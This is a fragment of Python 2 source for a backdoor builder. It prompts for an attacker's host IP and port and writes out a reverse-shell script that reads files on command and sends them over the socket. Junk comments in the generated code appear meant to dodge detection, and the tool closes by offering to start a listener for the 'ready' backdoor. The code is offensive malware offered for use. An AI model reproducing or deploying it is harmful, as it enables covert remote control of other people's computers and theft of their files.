...
def createshell():
    ...
    print "   "
    lhost= raw_input(bcolors.WARNING+"SEND ME THE HOST IP (LOCAL OR GLOBAL) >>>>> ")
    print "   "
    lport= raw_input(bcolors.WARNING+"SEND ME THE PORT >>>>> ")
    print "   "
    f = open("%s.py"%(name),"w+")
    f.write("""
'''
...
def cat(obj):
    obj2 = obj.replace('cat','')
    #ssasasasasasasnskjanska
    obj3 = obj2.replace(' ','')
    #ssasasasasasassldskmlskdmskldmskldsnlasnmlansla
    f = str(open(obj3,"r").readlines())
    #ssasasasasasassmalksamlsalsla
    s.sendall(f)
...
while 1:
    ...
    if "cat" in data:
        cat(data)
        #ssasasasasasassldskmlskdmskldmskldsak;slasasa
        s.send('--------------------')
        #ssasasasasasassamklsamlmsldsl
    if "cd" in data:
...
'''
    ...
    print "   "
    startlis = raw_input(bcolors.OKGREEN+'Your Backdoor Is Ready Do YOU WANNA START LISTENING ? ')
